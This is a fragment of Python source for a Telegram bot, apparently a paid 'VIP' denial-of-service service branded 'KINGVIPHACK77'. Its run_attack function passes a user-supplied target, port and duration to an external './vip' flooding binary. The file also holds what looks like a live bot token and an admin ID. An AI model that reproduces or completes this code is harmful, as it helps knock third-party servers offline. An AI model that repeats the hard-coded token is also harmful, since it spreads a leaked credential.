...
bot_token = '7806778918:AAF-YLr7LhRufugG8_Buxq3n_RFtHdjGjkM'  # Replace with your bot token
...
ADMIN_ID = 5027022179   # Replace with the actual admin's user ID
...
def run_attack(target, port, attack_time, sent_message):
    try:
        full_command = f"./vip {target} {port} {attack_time} 30"
...
def handle_contact_admin(message):
    bot.reply_to(message, f"📞 @KINGVIPHACK77: {ADMIN_ID}")
